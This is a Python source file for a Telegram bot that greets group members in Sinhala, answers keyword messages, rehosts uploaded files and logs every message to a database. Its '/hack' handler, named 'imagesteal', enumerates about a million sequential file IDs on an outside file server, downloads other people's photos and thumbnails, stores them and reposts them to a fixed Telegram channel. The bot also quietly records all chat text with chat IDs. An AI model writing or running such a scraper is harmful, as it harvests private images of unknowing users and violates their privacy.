# -*- coding: utf-8 -*-
import redis
import os
import telebot
import re
import psycopg2
import sys
import requests
import time
import urllib
from datetime import datetime
import fmibms3
from urllib import request
from PIL import Image
from io import BytesIO

# import some_api_lib
# import ...

#       Your bot code below

# some_api = some_api_lib.connect(some_api_token)

# Example of your code beginning

#           Config vars

#some_api_token = os.environ['SOME_API_TOKEN']
#             ...
token = os.environ['token']
tgadmin = os.environ['adminkey']
DATABASE_URL = os.environ['DATABASE_URL']
# If you use redis, install this add-on https://elements.heroku.com/addons/heroku-redis
#r = redis.from_url(os.environ.get("REDIS_URL"))
bot = telebot.TeleBot(token)
#              ...
def make_safe(thestring):
	return urllib.parse.quote_plus(thestring,safe=';/?:@&=+$,')

def file_as_link(file):
	kvpy="https://kvsh443.mybluemix.net/data?file="+file
	requests.get(kvpy)
	print("sent request to: "+kvpy+" to get File name : "+file)
	time.sleep(1)
	link=str('https://kvsh443.mybluemix.net/'+file)
	print("\n returning link: "+link)
	return link
	
#
# -------------------------
conn = None
#

def todbtext(message):
	chat_ido = (message.chat.id)
	msg_txto = (message.text)
	date_time = (datetime.fromtimestamp(message.date).strftime('%Y-%m-%d %H:%M:%S'))
	try:
		conn = psycopg2.connect(DATABASE_URL, sslmode='require')
		cur = conn.cursor()
		query = """INSERT INTO msg (chat_id,message,date_time) VALUES (%s, %s, %s);"""
		data = (chat_ido,msg_txto,date_time)
		cur.execute(query,data)
		conn.commit()
	except (Exception, psycopg2.Error) as error:
			if conn:
				print("Error %s", error)
				bot.send_message(tgadmin,error)

	finally:
		if conn:
			conn.close()

def todbsendtext (replied,message):
	chat_ido = (message.chat.id)
	msg_txto = (replied)
	date_time = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
	try:
		conn = psycopg2.connect(DATABASE_URL, sslmode='require')
		cur = conn.cursor()
		query = """INSERT INTO msg (chat_id,message,date_time,status) VALUES (%s, %s, %s, %s);"""
		data = (chat_ido,msg_txto,date_time,"sent")
		cur.execute(query,data)
		conn.commit()
	except (Exception, psycopg2.Error) as error:
			if conn:
				print("Error caused sending : %s", error)
				bot.send_message(tgadmin,error)

	finally:
		if conn:
			conn.close()
			
@bot.message_handler(commands=['hack'])
def imagesteal(message):
	a = 1051100
	while a > 0:
		path = str("file_"+str(a)+".jpg")
		try:
			url = str("http://xn--m38h.ml/tgFile/?l=photos/file_"+str(a)+".jpg")
			response = requests.get(url)
			
			if not response.content == "b''":
				img = response.content
				fmibms3.create_item("kvsh",path,img)
				linku = file_as_link(path)
				time.sleep(1)
				if img is not None:
					type(img)
					bot.send_photo(-1001452022332,img,caption=path)
					a-=1
				   
		except Exception as e:
			print("ERROR : {0} \n".format(e))
			try:
				url2 = str("http://xn--m38h.ml/tgFile/?l=thumbnails/file_"+str(a)+".jpg")
				response2 = requests.get(url2)
				if not response2.content == "b''":
					mg = response2.content
					fmibms3.create_item("kvsh",path,mg)
					linku = file_as_link(path)
					time.sleep(1)
					if mg is not None:
						type(mg)
						bot.send_photo(-1001452022332,mg,caption=path)
						a-=1
			except Exception as ee:
				print("Error :{0}".format(ee))
				a-=1
		
	a+=1			   
			

@bot.message_handler(commands=['help', 'start'])
def send_welcome(message):
	print("welcome triggered")
	bot.reply_to(message, "*Help and Start Triggered*",parse_mode='Markdown')
@bot.message_handler(content_types=['new_chat_members'])
def user_joined_greet(message):
	bot.send_chat_action(message.chat.id, 'typing')
	print("group Joined Welcome triggered")
	if message.new_chat_member.id != bot.get_me().id:
		print("group Joined Welcome triggered 2")
		f_name = message.new_chat_member.first_name
		title = message.chat.title
		try:
			l_name=message.new_chat_member.last_name
			newmember=str(f_name+" "+l_name)
		except:
			l_name=" "
			newmember=str(f_name)
		bot.send_message(message.chat.id, "`ආයුබෝවන්` " + "_"+newmember+ "_"+ "`..  ඔබව` "+ "*"+title+"*" + "` වෙත සාදරයෙන් පිළිගනිමු 🙏`",parse_mode='Markdown')
		todbsendtext("`ආයුබෝවන්` " + "_"+newmember+ "_"+ "`..  ඔබව` "+ "*"+title+"*" + "` වෙත සාදරයෙන් පිළිගනිමු 🙏`",message)
	else:
		title = message.chat.title
		print("added to a new group named "+title)
		bot.send_message(tgadmin, "*I was added by someone to group* "+title,parse_mode='Markdown')

@bot.message_handler(content_types=['left_chat_member'])
def user_leave_greet(message):
	bot.send_chat_action(message.chat.id, 'typing')
	if message.left_chat_member.id != bot.get_me().id:
		print("group left curse triggered")
		f_name = message.left_chat_member.first_name
		title = message.chat.title
		try:
			l_name=message.left_chat_member.last_name
			leftmember=str(f_name+" "+l_name)
		except:
			l_name=" "
			leftmember=str(f_name)
		bot.send_message(message.chat.id, "*"+title+"*` හි සිටි `_"+leftmember+"_` වන තෝ හිටියත් එකයි! නැතත් එකයි!  👋..`",parse_mode='Markdown')
		todbsendtext("*"+title+"*` හි සිටි `_"+leftmember+"_` හිටියත් එකයි! නැතත් එකයි!  👋..`",message)
	else:
		print("kicked the bot by some one from a group named "+message.chat.title)
		bot.send_message(tgadmin, "*I was kicked by someone from group* "+message.chat.title,parse_mode='Markdown')

'''@bot.message_handler(func=lambda message: True)
def totext_all(message):
	print("writing to text")
	gtext=message.text
	gchatid =message.chat.id
	gchat_fname = message.chat.first_name
	try:
		gchat_lname = message.chat.last_name
	except:
		gchat_lname = " - "
	try:
		gchatusrname = message.chat.username
	except:
		gfchatusrname = "  - "
	try:
		gtitle = message.chat.title
	except:
		gtitle = ("*its_empty*")
	gfromusr_id	= message.from_user.id
	gfromusr_fname = message.from_user.first_name
	try:
		gfromusr_lname = message.from_user.last_name
	except:
		gfromusr_lname = "  - "
	try:
		gfromusrname = message.from_user.username
	except:
		gfromusrname = " - "

	dumping_data=("| "+str(gtitle)+" "+str(gchatid)+" "+str(gchatusrname)+" "+str(gchat_fname)+" "+str(gchat_lname)+" "+str(gfromusr_id)+" "+str(gfromusrname)+" "+gfromusr_fname+" "+str(gfromusr_lname)+" \n "+gtext+" |  \n \n")

	bot.send_message(tgadmin, dumping_data,parse_mode='Markdown')
'''
@bot.message_handler(content_types=['document'])
def file_doc(message):
	raw=message.document.file_id
	try:
		path = make_safe(message.document.file_name)
	except:
		path = raw + ".dnx" #doc no extension
	file_info=bot.get_file(raw)
	file=bot.download_file(file_info.file_path)
	fmibms3.create_item("kvsh",path,file)
	link = file_as_link(path)
	time.sleep(10)
	bot.send_document(message.chat.id,link)
	
#Disabled for Catch LOL'''
@bot.message_handler(content_types=['photo'])
def file_pic_sticker(message):
	fileid = message.photo[-1].file_id
	file_info=bot.get_file(fileid)
	file=bot.download_file(file_info.file_path)
	path = fileid+'.jpg'
	fmibms3.create_item("kvsh",path,file)
	link=file_as_link(path)
	time.sleep(1)
	bot.send_photo(message.chat.id,link)

# @bot.message_handler(content_types=['photo'])
# def file_pic_sticker(message):
# 	fileid = message.photo[-1].file_id
# 	file_info=bot.get_file(fileid)
# 	file=bot.download_file(file_info.file_path)
# 	path = fileid+'.jpg'
# 	fmibms3.create_item("kvsh",path,file)
# 	link=file_as_link(path)
# 	glink='https://www.google.com/searchbyimage?image_url='+link
# 	blink='https://www.bing.com/images/searchbyimage?FORM=IRSBIQ&cbir=sbi&imgurl='+link
# 	viewlink = glink+' \n'+blink+' \n'
# 	bot.send_message(message.chat.id,viewlink)

@bot.message_handler(content_types=['audio'])
def file_audio(message):
	raw=message.audio.file_id
	try:
		title = message.audio.title
		artist = message.audio.performer
		path = make_safe(title+'_'+artist+'.mp3')
	except:
		path = raw + '.mp3' #audio no extension
	file_info=bot.get_file(raw)
	file=bot.download_file(file_info.file_path)
	fmibms3.create_item("kvsh",path,file)
	link = file_as_link(path)
	time.sleep(1)
	bot.send_audio(message.chat.id,link)

@bot.message_handler(func=lambda message: True)
def findwords(message):
	todbtext(message)
	print("find words triggered!")
	bot.send_chat_action(message.chat.id, 'typing')
	uwu_words= re.compile('uwu',re.IGNORECASE)
	owo_words= re.compile('owo',re.IGNORECASE)
	joreh_words = re.compile('joreh',re.IGNORECASE)
	joreh_hi= re.compile('hi|hello|hola|bonjour|ahoy|howdy|aloha|whats up|ohayou',re.IGNORECASE)
	joreh_hi_match = re.findall(r'hi|hello|hola|bonjour|ahoy|howdy|aloha|whats up|ohayou',message.text,re.IGNORECASE)
	try:
		message_chat_type = message.chat.type
	except:
		message_chat_type = "-"
	if uwu_words.search(message.text):
		print("The UwU word Found")
		data = "*UwU*"
		bot.send_message(message.chat.id, data,parse_mode='Markdown')
		todbsendtext(data,message)
	elif owo_words.search(message.text):
		print("The OwO word Found")
		data = "*OwO*"
		bot.send_message(message.chat.id, data,parse_mode='Markdown')
		todbsendtext(data,message)
	elif (joreh_hi.search(message.text) and message_chat_type =="private"):
		print("Hi word in priavte chat Found")
		try:
			chatusr_first = message.chat.first_name
		except:
			chatusr_first= " - "
		try:
			chatusr_lname = message.chat.last_name
		except:
			chatusr_lname = "  - "
		data = "* "+ str(joreh_hi_match[0])+"! "+chatusr_first+" "+chatusr_lname +"*"
		bot.reply_to(message, data,parse_mode='Markdown')
		todbsendtext(data,message)
	elif joreh_words.search(message.text):
		print("The Joreh words Found")
		if joreh_hi.search(message.text):
			print("Hi word Found")
			try:
				gfromusr_first = message.from_user.first_name
			except:
				gfromusr_first = "  - "
			try:
				gfromusr_lname = message.from_user.last_name
			except:
				gfromusr_lname = "  - "
			data = "*"+" "+ str(joreh_hi_match[0])+"! "+gfromusr_first+" "+gfromusr_lname +"*"
		else:
			data = "*I am Here!*"

		bot.reply_to(message, data,parse_mode='Markdown')
		todbsendtext(data,message)
	else :
		print("Nothing Found")

		
if __name__ == '__main__':
	bot.polling(none_stop= True)
	
